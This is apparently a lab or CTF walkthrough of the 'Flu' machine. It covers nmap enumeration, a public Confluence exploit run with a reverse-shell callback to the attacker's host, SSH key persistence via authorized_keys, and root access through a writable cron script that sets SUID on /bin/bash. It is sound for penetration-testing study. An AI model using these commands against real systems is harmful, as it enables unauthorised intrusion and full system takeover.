---
icon: ubuntu
---

# Flu - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.214.41 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 12:46 EDT
Nmap scan report for 192.168.214.41
Host is up (0.030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
|_http-trane-info: Problem with XML parsing of /evox/about
8091/tcp open  jamlink?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Thu, 25 Sep 2025 16:47:41 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Thu, 25 Sep 2025 16:47:11 GMT
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Thu, 25 Sep 2025 16:47:11 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Thu, 25 Sep 2025 16:47:11 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Thu, 25 Sep 2025 16:47:46 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.95%I=7%D=9/25%Time=68D5720F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Thu,\x2025\x20Sep\x202025\x2016:47:11\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Thu,\x2025\x20Sep\x202025\x2016:4
SF:7:11\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Thu,\x2025\x20Sep\x202025\x2016:47:11\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Thu,\x2025\x20S
SF:ep\x202025\x2016:47:41\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Thu,\x2025\x20Sep\x202025\x2016:
SF:47:46\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   29.43 ms 192.168.45.1
2   29.33 ms 192.168.45.254
3   29.45 ms 192.168.251.1
4   29.52 ms 192.168.214.41
```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1294).png" alt=""><figcaption></figcaption></figure>

Default credentials do not work. There is a version of Confluence displayed, a quick google search for exploits has led me to this [**repo**](https://github.com/jbaines-r7/through_the_wire) . The reppo offers us a script that we can use to read a file or get a shell on the target machine! I am going to try and get a shell

```
git clone https://github.com/jbaines-r7/through_the_wire.git
```

```
python3 through_the_wire.py --rhost 192.168.214.41 --rport 8090 --lhost 192.168.45.158 --protocol http:// --reverse-shell
```

<figure><img src="../../.gitbook/assets/image (1295).png" alt=""><figcaption></figcaption></figure>

I am going to setup ssh for a better shell and ease of access

```
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
cat id_rsa
```

<figure><img src="../../.gitbook/assets/image (1296).png" alt=""><figcaption></figcaption></figure>

I'll save the ssh key and give it the proper permissions than ssh

<figure><img src="../../.gitbook/assets/image (1297).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1298).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

Did not offer me much

<figure><img src="../../.gitbook/assets/image (1299).png" alt=""><figcaption></figcaption></figure>

Some ports open suggesting mysql, but it looked like a rabbit hole to me let's try something else

found some files that look like a cron job in /opt

<figure><img src="../../.gitbook/assets/image (1300).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1301).png" alt=""><figcaption></figcaption></figure>

we own log-backup.sh! Let's confirm my suspicion with [**pspy**](https://github.com/DominicBreuker/pspy/releases)!

### <mark style="color:$primary;">Pspy</mark>

```
wget 192.168.45.158/pspy64
chmod +x pspy64
timeout 3m ./pspy64
```

<figure><img src="../../.gitbook/assets/image (1302).png" alt=""><figcaption></figcaption></figure>

After waiting for a bit we see a hit and UID=0 means root is runnig our script!

I am going to modify the log-backup.sh script to add the SUID bit to /bin/bash

<figure><img src="../../.gitbook/assets/image (1303).png" alt=""><figcaption></figcaption></figure>

Now let's wait for root to execute it

<figure><img src="../../.gitbook/assets/image (1304).png" alt=""><figcaption></figcaption></figure>

Let's go it worked! I am going to run /bin/bash with -p flag to maintain privileges

<figure><img src="../../.gitbook/assets/image (1305).png" alt=""><figcaption></figcaption></figure>

Now we are root!
